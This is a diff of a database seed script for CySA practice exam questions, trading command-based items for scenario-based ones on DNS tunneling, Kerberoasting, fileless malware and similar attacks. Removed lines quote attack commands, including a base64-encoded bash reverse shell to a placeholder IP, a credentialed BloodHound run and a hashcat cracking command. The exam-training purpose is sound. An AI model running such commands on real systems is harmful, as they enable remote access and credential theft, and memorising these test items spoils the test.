@@ -1,12 +1,3 @@
-#5
-#7
-#11
-#13 
-#15
-#16,
-#3 
-
-
 db.tests.insertOne({
   "category": "cysa",
   "testId": 10,
@@ -41,16 +32,16 @@ db.tests.insertOne({
     },
     {
       "id": 3,
-      "question": "A penetration tester executes the following Nmap command:\n\n`nmap --script http-shellshock -p 80,443 <target>`\n\nWhat is the tester attempting to accomplish?",
+      "question": "An analyst is investigating unusual DNS queries in which multiple subdomains with random strings are being requested against a single external domain. The outbound traffic volume is low, but persistent, and each random subdomain appears only once. Which attacker technique is most likely being observed?",
       "options": [
-        "Exploiting the Shellshock vulnerability in a web server",
-        "Performing a denial-of-service attack",
-        "Enumerating open HTTP ports",
-        "Brute-forcing web application credentials"
+        "Exfiltrating data via DNS-based covert channels",
+        "Enumerating subdomains for an external takeover",
+        "Attempting domain fronting through a CDN",
+        "Configuring DNS hijacking for redirection attacks"
       ],
       "correctAnswerIndex": 0,
-      "explanation": "The `http-shellshock` script detects and exploits the Shellshock vulnerability (CVE-2014-6271) in web servers.",
-      "examTip": "Patch all Bash vulnerabilities and restrict untrusted CGI script execution."
+      "explanation": "The use of single-use random subdomains in repeated DNS queries is consistent with DNS tunneling for low-and-slow data exfiltration or command-and-control communication. While the other techniques can involve DNS queries, they typically involve distinct patterns (e.g., domain enumeration reuses known subdomains, domain fronting leverages legitimate services, and DNS hijacking focuses on name resolution manipulation rather than random subdomains).",
+      "examTip": "Monitor and baseline DNS logs for anomalies such as random subdomains or high entropy domain requests. Limit outbound DNS to trusted resolvers to mitigate DNS tunneling."
     },
     {
       "id": 4,
@@ -67,16 +58,16 @@ db.tests.insertOne({
     },
     {
       "id": 5,
-      "question": "A penetration tester runs the following command on an Active Directory network:\n\n`bloodhound-python -c All -u pentest -p Password123 -d corp.local`\n\nWhat is the tester attempting to do?",
+      "question": "A security team reviews Kerberos authentication logs and notices repeated requests for a particular service principal name (SPN). Each request is paired with attempts to crack tickets offline. The accounts used are normal domain users, and the SPN belongs to a highly privileged service account. Which attack method is most likely?",
       "options": [
-        "Enumerate Active Directory relationships for privilege escalation paths",
-        "Perform Kerberoasting to extract service account credentials",
-        "Dump NTLM password hashes from a domain controller",
-        "Scan for open SMB ports on a target network"
+        "Golden Ticket attack, forging TGTs to access services",
+        "Credential stuffing from compromised external databases",
+        "Kerberoasting, targeting service account password hashes",
+        "Pass-the-Hash attack using NTLM credential forwarding"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "BloodHound maps Active Directory relationships to help identify privilege escalation paths.",
-      "examTip": "Monitor for unauthorized AD enumeration and limit unnecessary user privileges."
+      "correctAnswerIndex": 2,
+      "explanation": "The repeated TGS requests for a specific SPN, along with offline cracking attempts, indicate a Kerberoasting attack. Golden Ticket attacks focus on forging TGTs, credential stuffing typically uses known credentials across multiple sites, and Pass-the-Hash attacks leverage NTLM hashes rather than Kerberos tickets.",
+      "examTip": "Monitor abnormal Kerberos activity and restrict service account privileges. Regularly rotate service account passwords to reduce Kerberoasting exposure."
     },
     {
       "id": 6,
@@ -93,16 +84,16 @@ db.tests.insertOne({
     },
     {
       "id": 7,
-      "question": "A forensic analyst discovers the following encoded command executed on a compromised Linux system:\n\n`echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuMTAvNDQzIDA+JjE=' | base64 -d | bash`\n\nWhat is the attacker attempting to do?",
+      "question": "While analyzing endpoint logs, a security analyst observes suspicious PowerShell commands generating ephemeral TCP connections to an external IP address at random intervals. The code appears to download scripts into memory, but no files are written to disk. Which tactic is the attacker most likely employing?",
       "options": [
-        "Establish a reverse shell to an external IP address",
-        "Exfiltrate sensitive data via DNS tunneling",
-        "Perform a brute-force attack on SSH credentials",
-        "Inject a malicious payload into kernel memory"
+        "Establishing a reverse shell to pivot into the internal network",
+        "Leveraging PowerShell remoting to move laterally within the domain",
+        "Executing a fileless malware technique for stealthy command-and-control",
+        "Abusing WMI for remote management tasks under stealth mode"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Decoding the Base64 string reveals a command that initiates a reverse shell connection via Netcat.",
-      "examTip": "Monitor for encoded commands and analyze Base64-decoded scripts for malicious intent."
+      "correctAnswerIndex": 2,
+      "explanation": "Repeated ephemeral connections paired with in-memory script execution strongly indicate a fileless malware approach. PowerShell remoting and WMI can be used for lateral movement, but the consistent memory-based script loading points to fileless C2 channels rather than standard administrative protocols. Reverse shells often produce persistent sessions, whereas this behavior shows random connection intervals.",
+      "examTip": "Implement strict PowerShell logging, including script block logging, to detect fileless malware. Restrict PowerShell to admin accounts or known safe scripts."
     },
     {
       "id": 8,
@@ -145,16 +136,16 @@ db.tests.insertOne({
     },
     {
       "id": 11,
-      "question": "A security analyst reviewing a suspicious command executed on a compromised Windows machine:\n\n`rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"`\n\nWhat is the attacker's objective?",
+      "question": "An internal forensics team captures a memory dump from a compromised server. Analysis reveals injected code that does not appear in any disk-based executable or DLL. The malicious thread is running within the same process space as a legitimate system service. What best describes this technique?",
       "options": [
-        "Executing JavaScript in a Windows environment to bypass security policies",
-        "Disabling Windows event logging",
-        "Escalating privileges to SYSTEM",
-        "Exfiltrating NTLM hashes via SMB relay"
+        "Reflective DLL loading to hide malicious binaries from disk scanners",
+        "Process hollowing to impersonate a trusted process during execution",
+        "Token impersonation to run commands under a privileged user context",
+        "Driver hooking to modify kernel-level functions dynamically"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "This command abuses `rundll32.exe` to execute JavaScript, which can be used to launch malware without triggering security controls.",
-      "examTip": "Monitor `rundll32.exe` executions and restrict script execution in Windows environments."
+      "correctAnswerIndex": 1,
+      "explanation": "Process hollowing involves starting a legitimate process, unmapping its memory, and injecting malicious code. Reflective DLL loading primarily focuses on loading DLLs directly from memory, token impersonation manipulates access tokens, and driver hooking modifies kernel routines. The presence of a malicious thread in a normal system service strongly suggests process hollowing.",
+      "examTip": "Routine memory analysis can detect suspicious in-memory injections. Tools like Sysmon and endpoint detection platforms can help correlate process anomalies."
     },
     {
       "id": 12,
@@ -171,16 +162,16 @@ db.tests.insertOne({
     },
     {
       "id": 13,
-      "question": "A penetration tester executes the following command:\n\n`nmap --script ldap-rootdse -p 389 <target>`\n\nWhat is the purpose of this scan?",
+      "question": "A network monitoring tool flags an internal host making repeated connection attempts to remote servers over an uncommon TCP port, typically associated with legacy file sharing. The sessions last only a few seconds, and no standard handshake or payload is observed. Which scenario is the most likely?",
       "options": [
-        "Extracting LDAP domain information from an Active Directory server",
-        "Brute-forcing LDAP credentials",
-        "Enumerating SMB shares on a domain controller",
-        "Exfiltrating hashed passwords from an LDAP database"
+        "Port scanning to enumerate vulnerable services for lateral movement",
+        "Covert channel tunneling data to an external attacker via custom protocols",
+        "Failed service discovery attempts from outdated software drivers",
+        "A honeypot detection script scanning for known infiltration tools"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "The `ldap-rootdse` script retrieves domain-related information from an LDAP server, which can aid in further attacks.",
-      "examTip": "Monitor LDAP queries and restrict anonymous access to sensitive directory information."
+      "correctAnswerIndex": 1,
+      "explanation": "Short, repeated connections on an uncommon port without completing the standard handshake strongly imply a custom or stealth protocol. This fits a covert channel scenario. While port scanning is possible, it would likely show multiple targeted ports. Outdated service discovery attempts and honeypot checks generally do not replicate the intermittent, consistent pattern of these stealthy, ephemeral connections.",
+      "examTip": "Look for unusual connection patterns on uncommon ports. Implement an allowlist approach to restrict outbound ports and monitor traffic flows at egress points."
     },
     {
       "id": 14,
@@ -197,29 +188,29 @@ db.tests.insertOne({
     },
     {
       "id": 15,
-      "question": "A penetration tester executes the following command:\n\n`hashcat -m 18200 -a 0 hashlist.txt wordlist.txt`\n\nWhat is the tester attempting to do?",
+      "question": "During threat-hunting efforts, an analyst spots outbound SMB traffic from an IT jump server to multiple domain controllers after hours. The traffic includes repeated attempts to list user and group information, though event logs show no explicit administrative actions. Which attacker technique best describes this scenario?",
       "options": [
-        "Cracking encrypted KeePass password vault hashes",
-        "Performing a brute-force attack on a remote SSH server",
-        "Decrypting Windows BitLocker encryption keys",
-        "Dumping password hashes from an Active Directory database"
+        "Exploiting SMB signing misconfiguration to hijack sessions",
+        "Performing internal reconnaissance using legitimate protocols",
+        "Conducting pass-the-ticket attacks for domain persistence",
+        "Brute forcing domain admin credentials through repeated logons"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Hashcat mode `18200` is used to crack KeePass password vault hashes using a dictionary attack.",
-      "examTip": "Use strong master passwords and enable two-factor authentication for password vaults."
+      "correctAnswerIndex": 1,
+      "explanation": "Stealthy enumeration of user and group data over SMB from a jump server suggests an attacker’s internal reconnaissance. Pass-the-ticket attacks and brute forcing credentials typically manifest as credential-based logon attempts, while SMB signing misconfiguration exploitation involves session hijacking and is less about systematic enumeration of user/group info.",
+      "examTip": "Watch for anomalous account enumeration activities at odd times. Regularly review privileged hosts' network connections and logs for unusual resource access patterns."
     },
     {
       "id": 16,
-      "question": "An attacker executes the following command on a Linux system:\n\n`iptables -A INPUT -p tcp --dport 22 -j DROP`\n\nWhat is the impact of this command?",
+      "question": "An incident response team discovers a hidden scheduled task executing a custom script from a rarely used system folder every 15 minutes. The script includes environment checks and dynamically modifies its payload before each run. No antivirus alerts have triggered thus far. Which attack methodology is likely being used?",
       "options": [
-        "Blocking SSH access to prevent administrators from regaining control",
-        "Redirecting SSH traffic to a malicious proxy",
-        "Creating a new firewall rule to allow persistent access",
-        "Disabling logging for SSH sessions"
+        "Living-off-the-land by using default system tasks to maintain persistence",
+        "Privilege escalation via a kernel exploit hidden within a scheduled driver load",
+        "Fileless persistence through registry-based run keys for a hidden payload",
+        "Periodic staging of polymorphic malware to evade signature-based detection"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "By blocking inbound SSH traffic, the attacker prevents administrators from remotely accessing the compromised machine.",
-      "examTip": "Monitor firewall rule changes and use centralized logging for security event tracking."
+      "correctAnswerIndex": 3,
+      "explanation": "A script that repeatedly alters its contents before execution indicates polymorphic behavior. Living-off-the-land typically uses built-in Windows utilities without changing the malicious payload itself. Registry-based run keys refer to a different persistence mechanism, and kernel exploit scheduling is distinct from a simple script-based approach. Polymorphism here is key to evading AV signatures.",
+      "examTip": "Implement behavior-based detection and watch for frequent script modifications. Restrict scheduled task creation permissions and monitor changes to system folder contents."
     },
     {
       "id": 17,
